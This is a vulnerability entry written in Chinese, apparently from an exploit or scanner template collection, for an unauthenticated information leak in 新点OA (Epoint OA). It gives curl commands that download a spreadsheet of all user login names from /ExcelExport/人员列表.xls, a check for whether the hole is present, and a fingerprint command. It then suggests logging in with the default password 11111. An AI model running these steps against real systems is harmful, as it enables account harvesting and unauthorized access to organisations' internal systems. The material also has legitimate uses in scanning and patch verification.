---
id: EPOINT-INFO-LEAK
title: 新点OA ExcelExport 用户信息泄露漏洞
product: epoint-oa
vendor: 新点软件
version_affected: "all versions"
severity: MEDIUM
tags: [info_disclosure, 无需认证, 国产, oa]
fingerprint: ["新点OA"]
---

## 漏洞描述

新点OA 存在敏感信息泄露漏洞，攻击者无需认证即可通过 `/ExcelExport/人员列表.xls` 路径下载包含所有用户登录名的 Excel 文件。获取登录名后可结合弱口令（默认密码 11111）登录后台。

## 影响版本

- 新点OA（所有已知版本）

## 前置条件

- 无需认证
- 目标运行新点OA

## 利用步骤

1. 确认目标为新点OA
2. 访问 ExcelExport 路径下载人员列表
3. 从 Excel 中获取所有用户登录名
4. 使用默认密码 11111 尝试登录

## Payload

```bash
# 下载用户列表
curl -s "http://target/ExcelExport/%E4%BA%BA%E5%91%98%E5%88%97%E8%A1%A8.xls" -o user_list.xls

# URL 解码版
curl -s "http://target/ExcelExport/人员列表.xls" -o user_list.xls
```

## 验证方法

```bash
# 检查是否返回 Excel 文件
curl -s "http://target/ExcelExport/%E4%BA%BA%E5%91%98%E5%88%97%E8%A1%A8.xls" -o /dev/null -w "%{http_code}\n%{content_type}"
# 返回 200 且 content_type 包含 excel/octet-stream 则存在漏洞
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "新点"
```
